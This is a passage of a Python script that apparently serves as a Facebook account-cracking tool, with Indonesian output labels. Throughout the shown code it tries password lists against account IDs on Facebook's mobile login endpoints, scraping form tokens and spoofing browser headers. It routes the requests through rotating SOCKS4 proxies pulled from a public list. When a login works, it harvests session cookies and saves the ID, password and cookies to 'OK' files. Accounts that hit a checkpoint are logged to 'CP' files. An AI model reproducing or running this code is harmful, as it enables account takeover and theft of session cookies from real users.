cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"])
			link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.prod.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				cetak(panel(f"\r[green]D    : {idf}\nPW    : {pw}\nTAHUN : {tahun(idf)}\n{kuki}",width=90,style=f"bold green",title=f"[white]Fadil-OK"))
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			#	open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				cetak(panel(f"\r[b yellow]ID    : {idf}\nPW    : {pw}\nUA    : {ua}",style=f"bold yellow",width=90,title=f"[bold white]Fadil-CP"))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akune.append(idf+'|'+pw)
				#ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ METODE B-API ]--------------------#
def bapi(idf,pwx):
	global loop,ok,cp
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f"\r[bold white][[green]{idf}[white]] [[green]{len(id)}[white]/[yellow]{loop}[white]] [[green]OK : {ok}[white]] [[yellow]CP:{cp}[white]]")
	ses = requests.Session()
	prog.advance(des)
	for pw in pwx:
		try:
			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
			open('socksku.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks4://'+nip}
			ua = ugenku(idf)
			ua2 = rc(["Mozilla/6.0 (Filipina; (iPad; CPU OS 4_3_3 like Mac OS X) AppleWebKit/650.2.12 (KHTML, like Gecko) Broswer/516.0.1.0 Safari/567.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"])
			ua = ugenku(idf)
			ref = rc([f"https://{url}/login.php?skip_api_login=1&api_key=2099441543493930&kid_directed_site=0&app_id=2099441543493930&signed_next=1&next=https%3A%2F%2F{url}%2Fv11.0%2Fdialog%2Foauth%3Fapp_id%3D2099441543493930%26cbt%3D1693466972390%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df263885d940389%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%26client_id%3D2099441543493930%26display%3Dtouch%26domain%3Daccount.hoyoverse.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252F%2523%252Flogin%253Fcb_route%253D%25252Faccount%25252FaccountInfo%26locale%3Did_ID%26logger_id%3Df24ea8b6c2199ac%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df348efd0f31f7e8%2526domain%253Daccount.hoyoverse.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Faccount.hoyoverse.com%25252Ff33e116a09cb6c8%2526relation%253Dopener%2526frame%253Df506dad7e5f0a4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv11.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df348efd0f31f7e8%26domain%3Daccount.hoyoverse.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Faccount.hoyoverse.com%252Ff33e116a09cb6c8%26relation%3Dopener%26frame%3Df506dad7e5f0a4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr"])
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v16.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'ASSqfFh8929p35Kn6/R+D8OSctQbVgiX+Pxpn8s5dImzlZcynOPPu9rnz5V0PKDXfbEwqT0VshbByU46SqsrXQ==','content-length': '332','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://developers.facebook.com/login/device-based/regular/login/?api_key=793139305026776&auth_token=0b6ec682004f184c19b735a0633758a7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&refsrc=deprecated&app_id=793139305026776&cancel=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[bold yellow]{idf}|{pw}")
				tree.add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"  ")
				tree.add(f"[bold green]{idf}|{pw}")
				tree.add(f"[bold green]{kuki}\n")
				cetak(tree) 
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
loop+=1
		
#----------[ SYSTEM-CONTROL ]----------#	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login()
#--------------[ Thanks To ]--------------#
#----> WANXD
#----> ARIFSENSEI
#---->JUKI OD SR.